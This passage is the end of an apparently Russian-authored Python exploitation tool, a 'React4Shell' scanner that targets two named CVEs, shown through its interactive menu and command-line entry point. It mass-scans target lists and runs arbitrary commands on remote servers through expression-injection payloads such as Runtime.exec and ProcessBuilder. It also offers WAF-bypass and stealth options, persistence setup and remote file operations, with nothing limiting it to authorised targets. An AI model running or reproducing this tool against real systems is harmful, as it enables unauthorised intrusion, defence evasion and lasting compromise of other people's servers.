                print(f"[!] Let's verify if RCE is real...\n")
                
                # Test 1: Check for real RCE
                is_real_rce = check_real_rce(target_url, endpoint)
                
                if not is_real_rce:
                    # Test 2: Check for blind RCE
                    print(f"\n[+] Checking for blind RCE...")
                    blind_rce_test(target_url, endpoint)
                
                # Test 3: Try different techniques
                print(f"\n[+] Trying alternative exploitation techniques...")
                
                alternative_payloads = [
                    # Try without echo
                    '{{T(java.lang.Runtime).getRuntime().exec("id")}}',
                    # Try with ProcessBuilder
                    '{{new java.lang.ProcessBuilder("id").start()}}',
                    # Try with redirect
                    '{{T(java.lang.Runtime).getRuntime().exec("id > /tmp/test.txt")}}',
                ]
                
                session = create_stealth_session()
                headers = get_random_headers()
                
                for i, alt_payload in enumerate(alternative_payloads, 1):
                    print(f"  Technique {i}: {alt_payload[:50]}...")
                    
                    full_payload = f'{{"query": "{alt_payload}"}}'
                    
                    try:
                        response = session.post(endpoint, data=full_payload, headers=headers, timeout=5)
                        
                        # Check for different status codes
                        if response.status_code not in [403, 404]:
                            print(f"    Status: {response.status_code}, Length: {len(response.text)}")
                            
                            # Look for any command output
                            if 'uid=' in response.text or 'root:' in response.text:
                                print(f"    [!] Possible real output found!")
                    except:
                        pass
                    
                    time.sleep(1)
        
        elif choice == '5':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (or press enter to scan first): ").strip()
            command = input("Enter command to execute (default: id): ").strip() or "id"
            
            if target_url:
                if not endpoint:
                    print("[+] Scanning for endpoints first...")
                    results = check_react4shell(target_url)
                    vulns = [r for r in results if r.get('vulnerable')]
                    
                    if vulns:
                        print(f"[+] Found {len(vulns)} potential endpoints")
                        for i, vuln in enumerate(vulns, 1):
                            print(f"  {i}. {vuln.get('endpoint')}")
                        
                        endpoint_choice = input("\nSelect endpoint number (or enter custom): ").strip()
                        if endpoint_choice.isdigit():
                            idx = int(endpoint_choice) - 1
                            if 0 <= idx < len(vulns):
                                endpoint = vulns[idx].get('endpoint')
                        else:
                            endpoint = endpoint_choice
                    else:
                        # Если не найдено уязвимостей, пробуем все endpoints в агрессивном режиме
                        print("[-] No vulnerabilities found. Testing all endpoints in aggressive mode...")
                        exploit_all_endpoints(target_url, command, aggressive=True)
                        return
                
                if endpoint:
                    exploit_vulnerability(
                        target_url=target_url,
                        endpoint=endpoint,
                        command=command,
                        aggressive=True
                    )
            else:
                print("[!] Target URL required")
        
        elif choice == '6':
            target_url = input("Enter target URL: ").strip()
            if target_url:
                results = cve_specific_scan(target_url)
                if results:
                    print(f"\n[+] Found {len(results)} potential CVE vulnerabilities:")
                    for result in results:
                        print(f"  - {result['cve']} at {result['endpoint']}")
                    
                    # Ask to exploit
                    exploit = input("\nExploit found vulnerabilities? (yes/no): ").strip().lower()
                    if exploit in ['yes', 'y']:
                        for result in results:
                            command = input(f"Enter command to execute on {result['cve']} (default: whoami): ") or "whoami"
                            hybrid_exploit(result['url'], result['endpoint'], command)
                else:
                    print("[-] No CVE vulnerabilities found")
        
        elif choice == '7':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (press enter for auto-detection): ").strip()
            command = input("Enter command to execute (default: id): ").strip() or "id"
            
            if target_url:
                if not endpoint:
                    # Auto-detect endpoints
                    print("[+] Auto-detecting endpoints...")
                    endpoints_to_try = [
                        "/api/graphql",
                        "/graphql",
                        "/actuator/health",
                        "/actuator/env",
                        "/v2/api-docs"
                    ]
                    
                    for ep in endpoints_to_try:
                        url = urllib.parse.urljoin(target_url.rstrip('/') + '/', ep.lstrip('/'))
                        print(f"\n[+] Trying {url}")
                        if hybrid_exploit(target_url, url, "echo 'test'"):
                            endpoint = url
                            break
                
                if endpoint:
                    hybrid_exploit(target_url, endpoint, command)
        
        elif choice == '8':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint: ").strip()
            
            if target_url and endpoint:
                advanced_persistence(target_url, endpoint)
        
        elif choice == '9':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint: ").strip()
            
            if target_url and endpoint:
                file_operations_menu(target_url, endpoint)
            else:
                print("[!] Target URL and endpoint required")
        
        elif choice == '10':
            input_file = input("Enter path to targets file: ").strip()
            output_file = input("Enter output file for results (default: cve_results.txt): ").strip() or "cve_results.txt"
            threads_input = input("Threads to use (press enter for auto): ").strip()
            threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else None

            if input_file:
                mass_cve_scan(input_file, output_file, threads=threads)
        
        elif choice == '11':
            target_url = input("Enter target URL to scan: ").strip()
            if target_url:
                print(f"[+] Starting detailed scan of {target_url}")
                results = check_react4shell(target_url)
                print(f"\n[+] Scan completed")
                
                vulns = [r for r in results if r.get('vulnerable')]
                if vulns:
                    print(f"[+] Found {len(vulns)} potential vulnerabilities:")
                    for vuln in vulns:
                        print(f"  - {vuln.get('endpoint')} ({vuln.get('vulnerable')})")
                    
                    verify = input("\nVerify if these are real RCE? (yes/no): ").strip().lower()
                    if verify in ['yes', 'y']:
                        for vuln in vulns:
                            print(f"\n[+] Verifying: {vuln.get('endpoint')}")
                            check_real_rce(vuln.get('url'), vuln.get('endpoint'), vuln.get('method', 'POST'))
                else:
                    print("[-] No vulnerabilities found")
        
        elif choice == '12':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint: ").strip()
            
            if target_url and endpoint:
                # Сначала проверяем, что уязвимость работает
                print("\n[+] Testing RCE...")
                exploit_vulnerability(
                    target_url=target_url,
                    endpoint=endpoint,
                    command="whoami"
                )
                
                confirm = input("\nDoes RCE work? (yes/no): ").strip().lower()
                if confirm in ['yes', 'y']:
                    establish_persistence(target_url, endpoint)
            else:
                print("[!] Target URL and endpoint required")
        
        elif choice == '13':
            print("[+] Exiting...")
            sys.exit(0)
        
        else:
            print("[!] Invalid option")

def main():
    """Main entry point with argument parsing"""
    parser = argparse.ArgumentParser(
        description='Ultimate React4Shell Scanner with CVE-2025-55182 & CVE-2025-66478 Exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s scan targets.txt results        # Scan targets and save reports
  %(prog)s exploit report.json            # Load and exploit from report
  %(prog)s menu                           # Start interactive menu
  %(prog)s direct http://target.com       # Direct exploitation (tests ALL endpoints)
  %(prog)s direct http://target.com -e /api/graphql  # Specific endpoint
  %(prog)s direct http://target.com -a -c "id"       # Aggressive mode with command
  %(prog)s direct http://target.com --test-all       # Test all endpoints without prompt
  %(prog)s direct http://target.com --cve-scan       # CVE-specific scan only
        """
    )
    
    subparsers = parser.add_subparsers(dest='mode', help='Operation mode')
    
    # Scan mode
    scan_parser = subparsers.add_parser('scan', help='Scan targets for vulnerabilities')
    scan_parser.add_argument('input_file', help='File containing URLs to scan')
    scan_parser.add_argument('output_prefix', help='Output prefix for report files')
    scan_parser.add_argument('-t', '--threads', type=int, help='Number of threads to use (default: auto)')
    
    # Exploit from report mode
    report_parser = subparsers.add_parser('exploit', help='Load and exploit from existing report')
    report_parser.add_argument('report_file', help='JSON report file to load')
    
    # Direct exploitation mode
    direct_parser = subparsers.add_parser('direct', help='Direct exploitation of a target')
    direct_parser.add_argument('target_url', help='Target URL to exploit')
    direct_parser.add_argument('-e', '--endpoint', help='Specific endpoint (default: test ALL endpoints)')
    direct_parser.add_argument('-c', '--command', default='id', help='Command to execute (default: id)')
    direct_parser.add_argument('-a', '--aggressive', action='store_true', help='Use aggressive WAF bypass')
    direct_parser.add_argument('--test-all', action='store_true', help='Test ALL endpoints without prompt')
    direct_parser.add_argument('--quick', action='store_true', help='Test only common endpoints')
    direct_parser.add_argument('--cve-scan', action='store_true', help='Perform CVE-specific scan only')
    direct_parser.add_argument('--hybrid', action='store_true', help='Use hybrid exploitation techniques')
    
    # CVE mass scan mode
    cve_parser = subparsers.add_parser('cve-scan', help='Mass CVE scanning')
    cve_parser.add_argument('input_file', help='File containing target URLs')
    cve_parser.add_argument('-o', '--output', default='cve_results.txt', help='Output file (default: cve_results.txt)')
    cve_parser.add_argument('-t', '--threads', type=int, help='Number of threads to use (default: auto)')
    
    # Menu mode
    subparsers.add_parser('menu', help='Start interactive menu')
    
    args = parser.parse_args()
    
    if not args.mode:
        parser.print_help()
        sys.exit(1)
    
    # Seed random for better randomness
    random.seed(time.time())
    
    # Set global timeout
    import socket
    socket.setdefaulttimeout(15)
    
    # Additional safety measures
    os.environ['PYTHONWARNINGS'] = 'ignore'
    
    try:
        if args.mode == 'scan':
            main_scan_mode(args.input_file, args.output_prefix, threads=args.threads)
        
        elif args.mode == 'exploit':
            load_report_and_exploit(args.report_file)
        
        elif args.mode == 'direct':
            if args.cve_scan:
                # CVE-specific scan only
                results = cve_specific_scan(args.target_url)
                if results:
                    print(f"\n[+] Found {len(results)} CVE vulnerabilities")
                    for result in results:
                        print(f"  - {result['cve']}: {result['endpoint']}")
            elif args.hybrid:
                # Hybrid exploitation
                endpoint = args.endpoint if args.endpoint else args.target_url.rstrip('/') + '/api/graphql'
                hybrid_exploit(args.target_url, endpoint, args.command)
            else:
                # Standard direct exploitation
                if args.endpoint:
                    # Пользователь указал конкретный endpoint
                    if args.endpoint.startswith('http'):
                        endpoint_url = args.endpoint
                    else:
                        endpoint_url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', args.endpoint.lstrip('/'))
                    
                    print(f"[+] Using specified endpoint: {endpoint_url}")
                    
                    exploit_vulnerability(
                        target_url=args.target_url,
                        endpoint=endpoint_url,
                        command=args.command,
                        aggressive=args.aggressive
                    )
                else:
                    # Проверяем все endpoints
                    if args.quick:
                        # Только common endpoints
                        common_endpoints = [
                            "/api/graphql",
                            "/graphql",
                            "/api/rest",
                            "/api/v1/graphql",
                            "/graphql-api",
                            "/api"
                        ]
                        print(f"[+] Testing {len(common_endpoints)} common endpoints...")
                        for endpoint_path in common_endpoints:
                            endpoint_url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', endpoint_path.lstrip('/'))
                            print(f"\n[+] Testing: {endpoint_url}")
                            exploit_vulnerability(
                                target_url=args.target_url,
                                endpoint=endpoint_url,
                                command=args.command,
                                aggressive=args.aggressive
                            )
                            time.sleep(0.5)
                    elif args.test_all:
                        # Тестируем все endpoints без подтверждения
                        exploit_all_endpoints(args.target_url, args.command, args.aggressive)
                    else:
                        # Автоматический поиск рабочих endpoints
                        print(f"[+] Auto-detecting working endpoints for {args.target_url}")
                        working_endpoints = find_working_endpoint(args.target_url)
                        
                        if working_endpoints:
                            print(f"[+] Found {len(working_endpoints)} working endpoints")
                            print("[+] Testing working endpoints...")
                            for ep in working_endpoints:
                                print(f"\n[+] Testing: {ep['url']}")
                                exploit_vulnerability(
                                    target_url=args.target_url,
                                    endpoint=ep['url'],
                                    method=ep.get('method', 'POST'),
                                    command=args.command,
                                    aggressive=args.aggressive
                                )
                                time.sleep(0.5)
                        else:
                            # Не найдено рабочих endpoints, спрашиваем пользователя
                            print(f"[-] No working endpoints found automatically")
                            print(f"[!] You can:")
                            print(f"  1. Test ALL endpoints ({len(ENDPOINTS) + len(CVE_ENDPOINTS)} endpoints)")
                            print(f"  2. Try common endpoints only")
                            print(f"  3. Enter custom endpoint")
                            
                            choice = input("\nSelect option (1/2/3): ").strip()
                            
                            if choice == '1':
                                exploit_all_endpoints(args.target_url, args.command, args.aggressive)
                            elif choice == '2':
                                common_endpoints = [
                                    "/api/graphql",
                                    "/graphql",
                                    "/api/rest",
                                    "/api/v1/graphql",
                                    "/graphql-api",
                                    "/api"
                                ]
                                for endpoint_path in common_endpoints:
                                    endpoint_url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', endpoint_path.lstrip('/'))
                                    print(f"\n[+] Testing: {endpoint_url}")
                                    exploit_vulnerability(
                                        target_url=args.target_url,
                                        endpoint=endpoint_url,
                                        command=args.command,
                                        aggressive=args.aggressive
                                    )
                                    time.sleep(0.5)
                            elif choice == '3':
                                custom_endpoint = input("Enter custom endpoint path: ").strip()
                                if custom_endpoint:
                                    if custom_endpoint.startswith('http'):
                                        endpoint_url = custom_endpoint
                                    else:
                                        endpoint_url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', custom_endpoint.lstrip('/'))
                                    
                                    exploit_vulnerability(
                                        target_url=args.target_url,
                                        endpoint=endpoint_url,
                                        command=args.command,
                                        aggressive=args.aggressive
                                    )
                            else:
                                print("[!] Invalid choice")
        
        elif args.mode == 'cve-scan':
            mass_cve_scan(args.input_file, args.output, threads=args.threads)
        
        elif args.mode == 'menu':
            main_menu()
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Critical error: {e}")

if __name__ == "__main__":
    main()
